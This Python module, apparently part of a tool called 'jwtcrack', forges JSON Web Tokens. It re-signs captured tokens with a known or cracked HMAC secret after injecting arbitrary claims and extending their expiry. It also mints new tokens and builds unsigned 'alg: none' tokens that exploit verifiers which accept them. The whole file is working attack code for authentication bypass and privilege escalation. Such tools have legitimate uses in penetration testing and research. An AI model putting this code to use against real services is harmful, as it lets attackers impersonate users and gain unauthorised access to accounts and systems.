import hashlib
import hmac
import json
import re
import time

from jwtcrack.decoder import base64url_encode, decode_token


def _sign_token(signing_input, secret, alg):
    algorithms = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    if alg.lower() == "none":
        return ""

    if alg not in algorithms:
        raise ValueError(f"Unsupported algorithm: {alg}")

    signature = hmac.new(
        secret.encode("utf-8"),
        signing_input.encode("utf-8"),
        algorithms[alg],
    ).digest()

    return base64url_encode(signature)


def _parse_duration(duration_str):
    if not duration_str:
        return 0

    match = re.match(r"^(\d+)([smhd])$", duration_str.strip().lower())
    if not match:
        raise ValueError(f"Invalid duration format: '{duration_str}'. Use format like '24h', '30m', '7d', '3600s'.")

    value = int(match.group(1))
    unit = match.group(2)

    multipliers = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    return value * multipliers[unit]


def forge_token(original_token, secret, new_claims, extend_exp=None, as_aspnet=False):
    decoded = decode_token(original_token)
    header = decoded["header"]
    payload = decoded["payload"]

    if as_aspnet:
        from jwtcrack.aspnet import to_aspnet_claims
        new_claims = to_aspnet_claims(new_claims)

    payload.update(new_claims)

    if extend_exp:
        extra_seconds = _parse_duration(extend_exp)
        current_exp = payload.get("exp", int(time.time()))
        payload["exp"] = int(current_exp) + extra_seconds

    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))
    signing_input = f"{header_b64}.{payload_b64}"

    alg = header.get("alg", "HS256")
    signature_b64 = _sign_token(signing_input, secret, alg)

    forged = f"{signing_input}.{signature_b64}"

    return {
        "token": forged,
        "header": header,
        "payload": payload,
        "algorithm": alg,
    }


def generate_token(secret, claims, alg="HS256", as_aspnet=False):
    header = {"alg": alg, "typ": "JWT"}

    if as_aspnet:
        from jwtcrack.aspnet import to_aspnet_claims
        claims = to_aspnet_claims(claims)

    if "iat" not in claims:
        claims["iat"] = int(time.time())
    if "exp" not in claims and "iat" in claims:
        claims["exp"] = claims["iat"] + 3600

    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(claims, separators=(",", ":")))
    signing_input = f"{header_b64}.{payload_b64}"

    signature_b64 = _sign_token(signing_input, secret, alg)

    token = f"{signing_input}.{signature_b64}"

    return {
        "token": token,
        "header": header,
        "payload": claims,
        "algorithm": alg,
    }


def forge_none_token(original_token, new_claims=None):
    decoded = decode_token(original_token)
    header = {"alg": "none", "typ": "JWT"}
    payload = decoded["payload"]

    if new_claims:
        payload.update(new_claims)

    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))

    return {
        "token": f"{header_b64}.{payload_b64}.",
        "header": header,
        "payload": payload,
        "algorithm": "none",
    }
